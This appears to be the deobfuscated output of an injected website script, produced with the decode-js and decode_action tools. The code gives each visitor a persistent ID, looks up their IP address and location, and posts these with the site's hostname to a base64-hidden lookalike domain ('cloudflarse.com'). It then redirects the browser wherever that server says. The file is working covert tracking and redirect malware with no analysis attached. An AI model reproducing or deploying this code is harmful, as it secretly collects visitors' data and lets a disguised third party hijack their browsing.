//Tue Apr 15 2025 05:13:08 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
function generateUUID() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (_0x284b11) {
    const _0x4cf9cc = Math.random() * 16 | 0,
      _0x1f909c = _0x284b11 === "x" ? _0x4cf9cc : _0x4cf9cc & 3 | 8;
    return _0x1f909c.toString(16);
  });
}
function getDeviceUUID() {
  let _0xb6cef1 = localStorage.getItem("deviceUUID");
  !_0xb6cef1 && (_0xb6cef1 = generateUUID(), localStorage.setItem("deviceUUID", _0xb6cef1));
  return _0xb6cef1;
}
async function getUserLocation() {
  try {
    const _0x2a0cec = await fetch("http://ip-api.com/json/"),
      _0x4c690f = await _0x2a0cec.json();
    return {
      "ip": _0x4c690f.query || "unknown",
      "city": _0x4c690f.city || "unknown",
      "region": _0x4c690f.regionName || "unknown",
      "country": _0x4c690f.country || "unknown"
    };
  } catch (_0x1b893b) {
    console.error("Error fetching user location:", _0x1b893b.message);
    return {
      "ip": "unknown",
      "city": "unknown",
      "region": "unknown",
      "country": "unknown"
    };
  }
}
async function sendRequestToServer(_0x1a424b, _0x49646d) {
  try {
    {
      const _0x70aaa4 = await fetch(_0x49646d, {
        "method": "POST",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": JSON.stringify(_0x1a424b)
      });
      if (!_0x70aaa4.ok) throw new Error("Failed to send request.");
      return await _0x70aaa4.json();
    }
  } catch (_0x203f06) {
    console.error("Error sending request to server:", _0x203f06.message);
    return null;
  }
}
async function main() {
  const _0x344265 = getDeviceUUID(),
    _0x2c66bb = await getUserLocation(),
    _0x3149ea = window.location.hostname || "localhost",
    _0x1d4b01 = {
      "uuid": _0x344265,
      "ip": _0x2c66bb.ip,
      "city": _0x2c66bb.city,
      "region": _0x2c66bb.region,
      "country": _0x2c66bb.country,
      "clientDomain": _0x3149ea,
      "timestamp": new Date().toISOString()
    },
    _0x3d099c = "aHR0cHM6Ly9jbG91ZGZsYXJzZS5jb20vbG9n",
    _0x3d80ba = atob(_0x3d099c),
    _0x54bb42 = await sendRequestToServer(_0x1d4b01, _0x3d80ba);
  _0x54bb42?.["redirect"] && setTimeout(() => {
    window.location.href = _0x54bb42.targetUrl;
  }, 2000);
}
main();